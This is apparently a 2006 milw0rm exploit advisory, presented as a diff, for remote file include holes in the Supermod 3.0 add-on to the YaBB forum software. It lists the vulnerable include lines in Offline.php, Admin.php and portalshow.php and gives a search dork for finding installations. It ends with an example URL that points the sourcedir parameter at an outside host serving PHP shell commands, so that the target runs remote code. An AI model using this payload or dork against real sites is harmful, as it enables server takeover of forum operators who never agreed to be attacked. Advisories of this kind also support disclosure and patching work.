@@ -1,0 +1,27 @@
+[DESCRIPTION] Remote file include vuln found by sZ [oct 09, 2006]
+[SOFTWARE]    Supermod 3.0 for yabb
+[VENDOR URL]  http://www.supermod.org
+[DORK]        YaBBSM V2.5.0 // Powered by YaBBSM V2.5.0 Based on YABB SE
+[NOTES]       greetz to: neo-vortex, sk0tie, icez, Solano College CIS students.
+ 
+
+VULN:
+Offline.php
+include("$sourcedir/pclzip.lib.php");
+They forgot to include settings.php, this file seems to not exist sometimes.
+ 
+VULN:
+Sources/Admin.php
+include_once("$sourcedir/Recent.php");
+ 
+VULN:
+Sources/Offline.php
+include_once("$sourcedir/Recent.php");
+ 
+VULN:
+content/portalshow.php
+include_once "$sourcedir/Calendar.php";
+ 
+[EXAMPLE] http://site.com/community/Offline.php?sourcedir=http://shellurl.com/phpcommands.txt?
+
+# milw0rm.com [2006-10-13]
